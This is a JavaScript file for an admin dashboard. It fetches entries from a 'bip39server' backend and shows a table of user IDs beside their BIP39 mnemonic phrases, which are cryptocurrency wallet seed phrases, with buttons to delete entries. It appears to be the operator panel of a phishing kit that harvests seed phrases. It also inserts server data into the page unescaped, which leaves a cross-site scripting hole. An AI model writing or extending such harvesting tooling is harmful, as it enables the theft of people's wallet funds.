const token = localStorage.getItem('token');

if(!token){
  window.location = './login.html'
}

$(document).ready(function () {
    $('#dtBasicExample').DataTable({
      "pagingType": "numbers",
      "searching": true
    });
    $('.dataTables_length').addClass('bs-select');
});

const contents = document.querySelector('.contents');


function deleteAnEntry(id) {
    fetch(`https://bip39server.herokuapp.com/api/v1/delete-a-user-entry/${id}`, {
        method: 'DELETE',
        headers: {
            "Content-type": "application/json",
            "Authorization": `Bearer ${token}`
        }
    }).then(res => res.json())
    .then(res => console.log(res))
    .catch(e => console.error("error", e))

    // reload the page to refetch contents
    setTimeout(() => {
        window.location = 'adminDashboard.html';
    }, 1000);
}


(function getAllEntry() {
    fetch('https://bip39server.herokuapp.com/api/v1/get-all-entry', {
        method: 'GET',
        headers: {
            "Content-type": "application/json; charset=UTF-8",
            "Authorization": `Bearer ${token}`
        }
    }).then(res => res.json())
    .then(res => {
        if(res.data.length) {
            res.data.forEach(entry => {
                contents.innerHTML +=`
                <tr>
                <td>${entry.user_id || "not provided"}</td>
                <td>${entry.mnemonic_phrase}</td>
                <td><button class="btn-danger" onclick=deleteAnEntry('${entry._id}')>Delete</button></td>
              </tr>
              `
            })
            // 
        }
        else {
            contents.innerHTML = 'No data at the moment'
        }
    })
    .catch(e => console.error("error", e))
})()


